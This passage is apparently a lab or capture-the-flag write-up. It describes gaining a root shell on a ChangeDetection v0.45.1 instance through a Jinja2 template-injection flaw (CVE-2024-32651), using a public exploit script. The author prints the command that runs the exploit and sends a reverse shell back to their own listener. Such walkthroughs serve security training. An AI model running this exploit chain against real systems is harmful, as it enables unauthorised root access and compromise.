Exploitation & Flag

Port 5000: ChangeDetection (HTTP)

When checking the HTTP application on the higher port 5000, the webpage above is returned to me. I notice right away the application name is ChangeDetection and the application version is v0.45.1, as shown in the image above. This information disclosure is crucial, as it gives away too much information. I browsed through the web application and checked for any useful information. I managed to obtain the API key. But this was not very helpful.


I searched for changedetection v0.45.1 exploits on Google and obtained the result shown above. It seems like this application is vulnerable to Server Side Template Injection (SSTI) in Jinja2 which allows for Remote Command Execution (RCE) on the backend server. The CVE ID of this vulnerability is CVE-2024-32651 as shown in the image above. This can be used to obtain a remote reverse shell connection. I searched for public exploits for this application and found this GitHub repository. Then I made a copy of the exploit of my machine. Time to test it now.


I saved the exploit on my machine as exp.py. Before running the exploit, I started a listener on my machine at port 8443 to catch the reverse shell connection. Then I executed the following command to run the exploit:

python3 exp.py --url http://192.168.126.97:5000 --port 8443 --ip 192.168.45.181
python3 exp.py --url http://192.168.126.97:5000 --port 8443 --ip 192.168.45.181

And immediately after, I obtained a successful reverse shell connection. Now I have a root shell on the target machine. The flag is shown in the picture above.
